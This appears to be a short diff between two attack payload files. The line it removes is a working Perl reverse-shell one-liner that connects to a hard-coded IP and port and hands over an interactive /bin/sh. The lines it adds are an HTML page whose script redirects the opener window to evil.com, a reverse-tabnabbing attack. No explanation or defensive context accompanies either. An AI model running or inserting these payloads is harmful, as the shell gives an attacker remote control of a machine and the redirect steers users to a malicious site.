@@ -1,1 +1,9 @@
-perl -e 'use Socket;$i="172.20.108.153";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+<html>
+ <body>
+  <script>
+   if (window.opener) {
+      window.opener.location = "https://evil.com";
+   }
+  </script>
+ </body>
+</html>
